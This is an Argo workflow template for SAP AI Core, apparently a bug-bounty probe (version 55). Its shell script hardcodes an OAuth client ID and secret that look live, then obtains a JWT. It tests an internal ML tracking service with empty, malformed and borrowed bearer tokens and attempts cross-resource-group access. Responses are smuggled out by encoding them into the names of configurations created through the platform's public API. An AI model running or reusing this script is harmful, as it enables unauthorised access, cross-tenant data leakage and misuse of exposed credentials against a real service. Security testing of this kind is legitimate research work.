apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "55.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V55: Hit tracking API WITH our XSUAA JWT
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v55-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        EXEC_ID=$(printenv AICORE_EXECUTION_ID)

        # 1. With XSUAA Bearer token
        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
        save "jwt-root-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/v1" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
        save "jwt-apiv1-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
        save "jwt-experiments-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/runs/search" -H "Authorization: Bearer $JWT" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0"]}' 2>&1 | head -c 200)
        save "jwt-runs-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${TRACK}/v1/metrics" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "jwt-v1metrics-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${TRACK}/v2/lm/metrics" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "jwt-v2metrics-$(echo $R | head -c 150)"

        # 2. With empty Bearer
        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer " 2>&1 | head -c 200)
        save "empty-root-$(echo $R | head -c 150)"

        # 3. With just "Bearer" (no space after)
        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer" 2>&1 | head -c 200)
        save "nospace-root-$(echo $R | head -c 150)"

        # 4. With execution ID as token
        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer ${EXEC_ID}" 2>&1 | head -c 200)
        save "execid-root-$(echo $R | head -c 150)"

        # 5. With AI-Resource-Group header + JWT
        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer $JWT" \
          -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "jwt-rg-experiments-$(echo $R | head -c 150)"

        # 6. Try SAP-specific tracking paths with JWT
        for path in "/v2/lm/executions/${EXEC_ID}/metrics" "/v2/lm/executions" "/api/v1/tracking/executions" "/api/v1/tracking/metrics"; do
          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
          SAFEPATH=$(echo "$path" | tr '/' '-')
          save "jwt${SAFEPATH}-$(echo $R | head -c 130)"
        done

        # 7. Try cross-RG access on tracking
        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer $JWT" \
          -H "AI-Resource-Group: bb-test-rg" 2>&1 | head -c 200)
        save "jwt-crossrg-$(echo $R | head -c 150)"

        echo "V55 DONE" >&2
